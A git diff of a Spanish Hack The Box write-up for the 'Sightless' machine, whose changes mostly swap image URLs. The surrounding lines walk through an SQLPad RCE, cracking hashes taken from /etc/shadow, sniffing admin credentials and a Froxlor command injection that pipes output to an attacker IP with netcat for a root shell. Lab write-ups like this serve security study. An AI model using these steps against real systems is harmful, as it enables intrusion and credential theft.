@@ -5,7 +5,7 @@ excerpt:
 date: 2025-1-17
 classes: wide
 header:
-  teaser: https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Sightless_avatar.png
+  teaser: https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Sightless_avatar.png
   teaser_home_page: true
 categories:
   - hacking
@@ -38,64 +38,64 @@ lo primero como siempre empezamos con el escaneo de nmap
 nmap -p- --open --min-rate 5000 -sT -Pn -vvv -n 10.10.11.32 -oG allports
 ```
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118113230.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118113230.png)
 
 ```bash
 nmap -sVC -p21,22,80 10.10.11.34 -oN ports
 ```
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118113350.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118113350.png)
 
 vemos un servidor ftp corriendo vamos a intentar loguear como anonimo
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118113529.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118113529.png)
 
 nada no consigo nada
 
 si hacemos un what web para ver lo que hay detras 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118113654.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118113654.png)
 
 conseguimos el dominio. lo ponemos en el /etc/hosts y lo repetimos
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118114031.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118114031.png)
 
 vemos un correo electronico por hay
 nada mas interesante 
 vamos a acceder
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118114410.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118114410.png)
 
 si nos vamos al apartado de servicios vemos algo que podria ser interesante
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118114519.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118114519.png)
 
 vemos un panel de SQLPad
 si le damos click
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118114830.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118114830.png)
 
 vemos un subdominio nuevo por lo que devemos añadirlo al etc/hosts para poder ver la web
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118115045.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118115045.png)
 
 vemos un panel sqlpad
 
 si vamos a la esquina superior derecha veremos 3 puntitos que nos permiten clickar sobre una opcion about
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118115431.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118115431.png)
 
 vemos la version de SQLPad
 por lo que podriamos hacer una busqueda de CVE o exploits a su nombre y version
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118115650.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118115650.png)
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118115720.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118115720.png)
 
 basicamnte podemos hacer un RCE a traves de una queri maliciosa y ponernos en escucha con netcat 
 
 para poder hacerlo vamos a tener que hacer lo siguiente.
 vamos a ir al panel de chose connection y vamos a crear una nueva usando de driver MYSql
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118120300.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118120300.png)
 
 para cargar el payload malicioso hay que ponerlo en el apartado Database
 en mi caso usare este
@@ -113,18 +113,18 @@ rlwrap -cAr nc -lvnp 9999
 ```
 
 y le damos a test
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118120651.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118120651.png)
 y tenemos shell. lo curioso es que somos root
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118121100.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118121100.png)
 
 esto es curioso
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118121145.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118121145.png)
 
 vale estamos dentro de un docker y somos root
 por lo que podrimamos leer el etc/shadow 
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118121441.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118121441.png)
 
 vemos un suuario michael al cual creo que podemos crekear la contraseña
 
@@ -134,7 +134,7 @@ para ello voy a usar hashcat
 hashcat -m 1800 -a 0 -o resul.txt hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118122223.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118122223.png)
 
 tenemos las password de los dos
 
@@ -143,11 +143,11 @@ por lo que voy a usar nxc para comprobar si valen para ssh
 nxc ssh 10.10.11.32 -u user.txt -p passwd.txt
 ```
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118123102.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118123102.png)
 
 vemos que michael se puede por lo que vamos
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118123444.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118123444.png)
 
 y tenemos el user
 
@@ -160,7 +160,7 @@ ss -ntlp
 
 vemos una cosa curiosa
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118123951.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118123951.png)
 
 vemos el puerto 8080 abierto
 si hacemos un curl desde la propia maquian vemos cosas interesante:
@@ -169,7 +169,7 @@ si hacemos un curl desde la propia maquian vemos cosas interesante:
 curl -s 127.0.0.1:8080
 ```
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118124303.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118124303.png)
 vemos una pagina web
 por lo quehay que hacer Local Port Forwarding. yo lo voy a hacer con ssh, se podria con chisel y es mas profesional pero tampoco me quiero comer mucho la cabeza con una maquina de baja dificultada
 
@@ -178,7 +178,7 @@ entonces para ello vamos a hacerlo siguiente
 ssh michael@10.10.11.32 -L 8080:172.17.0.2:8080
 ```
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118125531.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118125531.png)
 
 vemos el siguiente panel de login 
 
@@ -188,7 +188,7 @@ de vuelta a ssh si hacemos
 ps aux 
 ```
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118130042.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118130042.png)
 
 vemos que hay un servicio google crome corriendo
 El usuario `john` tiene abierta una sesión con `Google Chrome`.
@@ -198,7 +198,7 @@ Usualmente, cuando ejecutamos un software como `Google Chrome`, éste requiere d
 ss -nltp | awk '{print $4}' | grep -v Local | awk -F : '{print $2}' | grep -v '^$' | sort -u
 ```
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118130325.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118130325.png)
 
 De aquí, empezaremos a descargar los servicios los cuales sabemos qué están corriendo y ya hemos identificado: `21` (`FTP`), `22` (`SSH`), `53` (`DNS`), `80` (puerto `HTTP` página web principal), `3000` (puerto por defecto para SQLPad, como se pude ver [aquí](https://getsqlpad.com/en/getting-started/)), `3306` y `33060` (`MySQL`); y `8080` (servicio web `Froxlor`).
 
@@ -217,19 +217,19 @@ si le damos a configure
 vamos a poner ese puerto y le damos a done
 Uno de los puertos que podría estar expuesto en la máquina víctima es el de la sesión de Google Chrome. En mi caso específico, el puerto y la IP que encontré fue 127.0.0.1:33911. Al añadirlo, aparece un mensaje de Froxlor. Si accedemos al primer enlace y seleccionamos la opción Inspect, podemos observar una animación en pantalla. Esta muestra cómo un usuario inicia sesión en el panel de Froxlor. Utilizando la pestaña de Desarrolladores, accedemos a la sección Network y, una vez el usuario haya iniciado sesión, podemos inspeccionar el recurso index.php y revisar la pestaña Payload. Allí encontramos:
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250119113409.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250119113409.png)
 
 Podemos ver que el parámetro loginname corresponde a un usuario llamado admin y la contraseña es ForlorfroxAdmin.
 
 Luego, accedemos a http://127.0.0.1:8080 e ingresamos las credenciales admin:ForlorfroxAdmin, logrando acceder al panel como usuario admin:
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250119113523.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250119113523.png)
 
 En el panel, en la barra lateral izquierda, encontramos una pestaña llamada PHP. Al hacer clic en ella, vemos varias opciones. Entre ellas, se encuentra la pestaña PHP-FPM versions. Investigando un poco más, descubrimos que es una herramienta para gestionar procesos de PHP de manera eficiente.
 
 Al hacer clic en PHP-FPM versions y luego en Create new PHP version, se muestra una nueva página. En esta, intentamos ejecutar el comando whoami y redirigir su salida a nuestra máquina atacante utilizando un pipe (|) junto con netcat. En el panel de Froxlor, ingresamos el comando whoami | nc 10.10.16.5 4444 y en nuestra máquina atacante iniciamos un listener en el puerto 4444 ejecutando nc -lvnp 4444. En la máquina víctima, añadimos el payload mencionado:
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250119113715.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250119113715.png)
 
 Sin embargo, encontramos un problema. Al hacer clic en Save, obtenemos un error. Anteriormente habíamos probado con comandos más sencillos como whoami e id, y funcionaron, por lo que sospechamos que el pipe (|) podría estar interfiriendo. Debido a que nuestra sesión con el usuario michael está siendo utilizada por Chisel para establecer el túnel, nos volvemos a conectar por SSH como michael (sin cerrar la sesión de Chisel) y creamos un script simple en Bash que enviará una reverse shell a nuestra máquina atacante:
 ```bash
@@ -252,11 +252,11 @@ Posteriormente, nos dirigimos a System > Settings > PHP-FPM, desactivamos el ser
 
 En la sección de Cronjob Settings, encontramos un cronjob que se ejecuta cada 5 minutos llamado Generating of configfiles. Supusimos que este cronjob ejecutaría el payload, por lo que tuvimos que esperar hasta la próxima hora y minutos terminados en XX:X5 (es decir, cada 5 minutos).
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250119113755.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250119113755.png)
 
 
 Después de unos minutos, el cronjob se ejecuta y, finalmente, conseguimos una conexión en nuestro listener como usuario root.
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250119113815.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250119113815.png)
 
-![](https://404zzero.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118131751.png)
+![](https://fallenangel666-htb.github.io/zzero.github.io//assets/images/Sightless/Pasted-image-20250118131751.png)
